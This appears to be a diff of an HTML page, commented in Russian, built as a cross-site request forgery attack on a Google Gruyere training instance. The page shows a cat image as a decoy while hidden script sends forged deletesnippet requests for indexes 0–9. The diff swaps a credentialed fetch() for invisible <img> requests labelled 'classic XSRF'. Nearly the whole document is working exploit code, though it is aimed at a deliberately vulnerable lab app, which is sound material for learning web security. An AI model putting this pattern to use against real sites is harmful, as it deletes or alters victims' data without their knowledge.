@@ -8,26 +8,22 @@
   <img src="https://i.imgur.com/8UXpQeA.jpg" alt="Котики" width="500">
 
   <script>
-    // Твой уникальный ID экземпляра Gruyere
+    // Твой ID (проверь, что экземпляр жив!)
     const GRUYERE_ID = '643453999600290416051506802884356354571';
     const BASE_URL = `https://google-gruyere.appspot.com/${GRUYERE_ID}/deletesnippet`;
 
-    // Функция удаления сниппета по индексу
-    function deleteSnippet(index) {
-      const url = `${BASE_URL}?index=${index}`;
-      fetch(url, {
-        method: 'GET',
-        mode: 'no-cors',  // Чтобы не блокировать кросс-доменный запрос
-        credentials: 'include'  // Критично: отправляет куки!
-      }).then(() => console.log(`Сниппет ${index} удалён (или запрос отправлен)`))
-      .catch(() => console.log(`Сниппет ${index} не найден или ошибка (возможно, конец списка)`));
+    // Удаление через <img> — классическая XSRF
+    function xsrfDelete(index) {
+      const img = new Image();
+      img.src = `${BASE_URL}?index=${index}`;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+      console.log(`XSRF: запрос на удаление index=${index} отправлен`);
     }
 
-    // Удаляем сниппеты по порядку (0, 1, 2, 3, 4, 5...)
-    // Остановимся, когда будет ошибка (но мы не узнаем — так что просто переберём много)
+    // Удаляем первые 10 сниппетов
     for (let i = 0; i < 10; i++) {
-      // Задержка, чтобы сервер успевал обрабатывать
-      setTimeout(() => deleteSnippet(i), i * 300);
+      setTimeout(() => xsrfDelete(i), i * 400);
     }
   </script>
 </body>
